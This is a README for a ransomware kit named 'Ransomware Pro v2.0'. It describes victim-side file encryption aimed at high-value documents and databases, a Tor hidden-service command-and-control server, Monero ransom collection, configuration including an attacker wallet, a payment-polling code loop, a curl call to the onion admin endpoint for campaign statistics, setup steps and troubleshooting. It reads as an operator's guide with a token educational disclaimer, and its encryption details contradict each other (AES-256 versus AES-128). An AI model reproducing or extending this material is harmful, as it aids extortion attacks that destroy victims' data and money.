# RANSOMWARE PRO v2.0

**Professional-Grade Ransomware with Encrypted C2 Communication**

---

## 🎯 Architecture Overview

```
┌──────────────────────────────────┐
│   VICTIM SYSTEM (ransomware_core.py)        │
│   - File encryption (AES-256)               │
│   - Payment monitoring                      │
│   - Auto-decryption on payment              │
└──────────────────────────────────┘
         ↓ (Tor/.onion)
    [ENCRYPTED TUNNEL]
         ↓
┌──────────────────────────────────┐
│   C2 SERVER (c2_server.py)                  │
│   - Tor Hidden Service                      │
│   - REST API (encrypted)                    │
│   - Victim database (encrypted)             │
│   - Payment verification                    │
│   - Key distribution                        │
└──────────────────────────────────┘
```

---

## 📋 Features

### **Victim Side (ransomware_core.py)**
- ✅ **AES-256 Encryption** with PBKDF2 key derivation
- ✅ **Encrypted C2 Communication** via Tor SOCKS5
- ✅ **Automatic Payment Monitoring** (background thread)
- ✅ **Auto-Decryption** after payment verified
- ✅ **High-Value File Targeting** (.docx, .xlsx, .sql, .db, etc.)
- ✅ **Stealth Mode** (no debug output)
- ✅ **Multi-threaded Design**

### **Server Side (c2_server.py)**
- ✅ **Tor Hidden Service** (.onion address)
- ✅ **Encrypted Database** (Fernet encryption)
- ✅ **REST API Endpoints:**
  - `/api/v1/register` - Register new infection
  - `/api/v1/payment/status/{id}` - Check payment
  - `/api/v1/decryption/key/{id}` - Get decryption key (if paid)
  - `/api/v1/admin/stats` - Campaign statistics
- ✅ **Monero Payment Verification** (blockchain monitoring)
- ✅ **Key Management** (encrypted storage)
- ✅ **Campaign Statistics**

---

## 🔐 Security Features

### **Communication Security**
- Tor SOCKS5 proxy (anonymity)
- All traffic encrypted
- No cleartext data transmission
- No IP leakage

### **Encryption Security**
- AES-256 in Fernet mode
- PBKDF2 key derivation (100,000 iterations)
- Random salt per file
- Master key never transmitted in plaintext

### **Database Security**
- Encrypted victim database (Fernet)
- Master keys stored encrypted
- Payment records encrypted
- No unencrypted sensitive data on disk

### **Anonymity**
- Tor hidden service (.onion)
- Monero for payment (untraceable)
- No C&C domain registration
- No IP addresses in code

---

## 🚀 Installation & Setup

### **Requirements**
```bash
pip install -r requirements.txt
```

### **Tor Setup** (Windows)
1. Download Tor Browser from torproject.org
2. Configure Tor SOCKS5 on localhost:9050
3. Start Tor in background

### **Monero Setup** (For C2)
1. Install monerod daemon
2. Configure local wallet
3. Update C2_SERVERS config

---

## 🔄 Execution Flow

### **Phase 1: Infection**
```python
ransomware = RansomwareCore()
ransomware.run()
```
1. Scan system for high-value files
2. Encrypt files with random AES-256 key
3. Register with C2 (encrypted, Tor)
4. Display ransom note
5. Start payment monitoring loop

### **Phase 2: Payment Monitoring**
```python
def monitor_payment(self):
    while True:
        payment_status = self.c2.check_payment_status()
        if payment_status and payment_status['paid']:
            # Payment received!
            master_key = self.c2.request_decryption_key()
            self.decrypt_all_files(master_key)
            return
        time.sleep(30)
```
- Check C2 every 30 seconds
- No blocking - runs in background
- Monero transaction monitoring

### **Phase 3: Decryption**
- Master key received from C2
- All .LOCKED files decrypted
- Original files restored
- Encrypted files deleted

---

## 🛠️ Configuration

### **Victim Side** (ransomware_core.py)
```python
C2_ONION = "http://ransomware-c2-12345.onion"  # Real .onion address
MONERO_WALLET_ADDRESS = "4BJV39..."  # Attacker's wallet
RANSOM_AMOUNT_XMR = 3.5  # Amount in Monero
ENCRYPTION_EXTENSION = ".LOCKED"  # File extension
PBKDF2_ITERATIONS = 100000  # Key derivation iterations
```

### **Server Side** (c2_server.py)
```python
DATABASE_PATH = '/var/ransomware/victims.db'  # Victim database
MONERO_DAEMON = "http://localhost:18081"  # Local monerod
MASTER_ENCRYPTION_KEY = Fernet.generate_key()  # Master key (store securely!)
```

---

## 📊 Attack Timeline

| Time | Event |
|------|-------|
| T+0 | Ransomware executes, encrypts files |
| T+1min | Registration with C2 |
| T+1min | Ransom note displayed |
| T+1min | Payment monitoring starts |
| T+30sec intervals | Payment status checks |
| T+X (After payment) | Monero TX detected |
| T+X+1min | Decryption key retrieved |
| T+X+2min | All files automatically decrypted |

---

## 🔍 Victim Experience

1. System is slow, many files renamed to `.LOCKED`
2. Desktop shows `README_DECRYPT.txt`
3. Instructions: Send 3.5 XMR to wallet address
4. **Important:** After payment, files are AUTOMATICALLY decrypted
5. No tool downloads, no extra steps

---

## 🖥️ C2 Admin Dashboard

Access campaign statistics:
```bash
curl http://ransomware-c2-12345.onion/api/v1/admin/stats
```

Response:
```json
{
  "total_victims": 127,
  "paid_victims": 43,
  "total_revenue_xmr": 150.5
}
```

---

## ⚠️ Legal Disclaimer

**EDUCATIONAL PURPOSE ONLY**

This code is provided for educational and authorized security research purposes only. Unauthorized use is illegal under computer fraud and abuse laws worldwide.

The author assumes NO responsibility for:
- Unauthorized deployment
- Damage caused
- Legal consequences
- Data loss
- Financial harm

---

## 📚 Technical Details

### **Encryption Algorithm**
- **Cipher:** Fernet (AES-128 in CBC mode)
- **Key Derivation:** PBKDF2-SHA256
- **Iterations:** 100,000
- **Salt:** Random per file
- **IV:** Included in Fernet token

### **Communication Protocol**
- **Transport:** Tor SOCKS5
- **Protocol:** HTTPS (over Tor)
- **Encoding:** JSON
- **Auth:** Ransom ID (no credentials needed)

### **Payment Verification**
- **Blockchain:** Monero
- **Verification:** Daemon queries
- **Confirmations:** 10+ required
- **Monitoring:** Every 2 minutes

---

## 🔧 Troubleshooting

### **Tor Connection Failed**
- Ensure Tor is running on localhost:9050
- Check firewall settings
- Verify SOCKS5 proxy configuration

### **Payment Not Detected**
- Verify Monero TX was sent correctly
- Check wallet address is correct
- Wait for confirmations (10+)

### **Decryption Failed**
- Ensure master key is correct
- Check file permissions
- Verify .LOCKED files exist

---

## 📝 File Structure

```
ransomware_pro/
├── ransomware_core.py      # Victim payload
├── c2_server.py            # Attacker C2 server
├── requirements.txt        # Python dependencies
└── README.md              # This file
```

---

**Created:** December 5, 2025
**Version:** 2.0
**Status:** Professional-Grade Implementation
